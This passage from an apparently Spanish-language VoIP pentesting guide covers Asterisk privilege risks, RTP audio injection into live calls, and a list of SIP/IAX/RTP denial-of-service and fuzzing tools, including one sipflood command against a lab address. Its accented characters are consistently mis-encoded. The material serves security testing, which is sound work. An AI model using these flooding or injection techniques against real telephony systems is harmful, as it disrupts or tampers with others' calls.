* **Varias carpetas** pertenecerÃ¡n al usuario de Asterisk comprometido (si no se estÃ¡ ejecutando como root). Este usuario puede leer los archivos anteriores y tambiÃ©n controla la configuraciÃ³n, por lo que podrÃ­a hacer que Asterisk cargue otros binarios con puertas traseras cuando se ejecuten.

### InyecciÃ³n de RTP

Es posible insertar un archivo **`.wav`** en las conversaciones utilizando herramientas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) y **`rtpmixsound`** (`sudo apt install rtpmixsound`).

O puedes utilizar los scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversaciones** (**`rtpscan.pl`**), enviar un archivo `.wav` a una conversaciÃ³n (**`rtpsend.pl`**) e **insertar ruido** en una conversaciÃ³n (**`rtpflood.pl`**).

### DoS

Existen varias formas de intentar lograr un ataque de denegaciÃ³n de servicio (DoS) en servidores VoIP.

* **`sipflood.py`** de [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ envÃ­a mensajes ilimitados al objetivo.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Ataque de DoS al protocolo IAX utilizado por Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Una herramienta para realizar inundaciones de mensajes SIP/SDP INVITE a travÃ©s de UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): EnvÃ­a varios paquetes RTP bien formados. Es necesario conocer los puertos RTP que se estÃ¡n utilizando (hacer un sniff primero).
* [**SIPp**](https://github.com/SIPp/sipp): Permite analizar y generar trÃ¡fico SIP, por lo que tambiÃ©n se puede utilizar para realizar ataques de DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Navaja suiza SIP. TambiÃ©n se puede utilizar para realizar ataques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend nos permite enviar un mensaje SIP personalizado y analizar la respuesta.
* **`wssend.py`** de [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend nos permite enviar un mensaje SIP personalizado a travÃ©s de WebSockets y analizar la respuesta.

### Vulnerabilidades del sistema operativo

La forma mÃ¡s sencilla de instalar un software como Asterisk es descargar una **distribuciÃ³n del sistema operativo** que ya lo tenga instalado, como: **FreePBX, Elastix, Trixbox**... El problema con estos es que una vez que estÃ¡n funcionando, los administradores del sistema podrÃ­an **no actualizarlos nuevamente** y se descubrirÃ¡n vulnerabilidades con el tiempo.

## Referencias

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
